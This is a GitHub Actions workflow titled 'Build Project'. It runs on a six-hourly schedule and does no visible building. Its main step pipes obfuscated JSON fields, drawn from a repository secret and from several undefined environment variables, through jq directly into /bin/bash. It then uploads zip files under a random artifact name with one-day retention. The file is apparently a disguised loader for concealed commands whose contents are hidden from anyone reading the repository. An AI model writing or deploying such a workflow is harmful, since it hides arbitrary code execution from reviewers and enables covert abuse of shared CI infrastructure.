name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '37 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          zi9: ${{ secrets.zi9 }}
        run: |
          printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
          printf '%s' "$g3" | jq -r .nwagt3577 | /bin/bash
          printf '%s' "$av613" | jq -r .b8 | /bin/bash
          echo $hbea82 | jq -r .cbbwu938 | /bin/bash
          printf '%s' "$hcn82618" | jq -r .iucde3 | /bin/bash
          echo $lbri9 | jq -r .kgu5 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: DQcZFPeY
          path: "*.zip"
          retention-days: 1
